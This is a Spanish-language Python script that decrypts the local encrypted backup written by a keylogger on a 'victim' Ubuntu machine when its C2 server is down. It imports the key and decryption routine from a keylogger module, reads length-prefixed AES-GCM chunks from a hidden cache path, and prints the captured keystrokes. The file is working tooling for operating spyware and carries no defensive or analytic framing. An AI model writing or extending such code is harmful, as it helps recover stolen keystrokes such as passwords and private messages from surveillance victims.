"""
decrypt_backup.py
=================
Herramienta de descifrado para los archivos de backup locales generados
por el keylogger cuando el servidor C2 no está disponible.

Ubicación del backup en Ubuntu 24.04 víctima:
    ~/.local/share/.cache_sys/session.enc

Uso
---
    # Descifrar el backup por defecto
    python3 decrypt_backup.py

    # Descifrar un archivo específico
    python3 decrypt_backup.py /ruta/al/archivo.enc
"""

import os
import sys
import struct
import logging

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from keylogger import AES_KEY, decrypt_payload, LOG_FILE

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
log = logging.getLogger("decrypt_backup")


def decrypt_backup_file(path: str) -> None:
    """
    Lee y descifra todos los chunks almacenados en el archivo de backup.

    Formato del archivo (escrito por keylogger._save_backup)
    ---------------------------------------------------------
    Secuencia de registros: [4 bytes big-endian longitud] + [payload cifrado]
    Cada payload cifrado contiene: nonce(12) + ciphertext + tag_gcm(16)

    Parámetros
    ----------
    path : str
        Ruta al archivo de backup cifrado (session.enc).
    """
    if not os.path.isfile(path):
        log.error("Archivo no encontrado: %s", path)
        log.info("Ruta de backup por defecto: %s", LOG_FILE)
        return

    log.info("Leyendo backup: %s", path)
    total_chunks = 0
    total_chars  = 0

    with open(path, "rb") as f:
        print("\n" + "═" * 70)
        print("  DESCIFRADO DE BACKUP LOCAL")
        print("  Archivo: " + path)
        print("═" * 70)

        while True:
            header = f.read(4)
            if not header:
                break
            if len(header) < 4:
                log.warning("Header truncado al final del archivo.")
                break

            (length,) = struct.unpack(">I", header)
            payload = f.read(length)
            if len(payload) < length:
                log.warning(
                    "Chunk truncado: esperados %d bytes, leídos %d.",
                    length, len(payload)
                )
                break

            try:
                plaintext = decrypt_payload(payload, AES_KEY)
                text      = plaintext.decode("utf-8", errors="replace")
            except Exception as exc:
                log.error("Error descifrado chunk #%d: %s", total_chunks + 1, exc)
                continue

            total_chunks += 1
            total_chars  += len(text)
            print(f"\n─── Chunk #{total_chunks}  ({len(text)} caracteres) ───")
            print(text)

    print("\n" + "═" * 70)
    print(f"  Total chunks descifrados: {total_chunks}")
    print(f"  Total caracteres: {total_chars}")
    print("═" * 70 + "\n")


def main() -> None:
    backup_path = sys.argv[1] if len(sys.argv) > 1 else LOG_FILE
    decrypt_backup_file(backup_path)


if __name__ == "__main__":
    main()
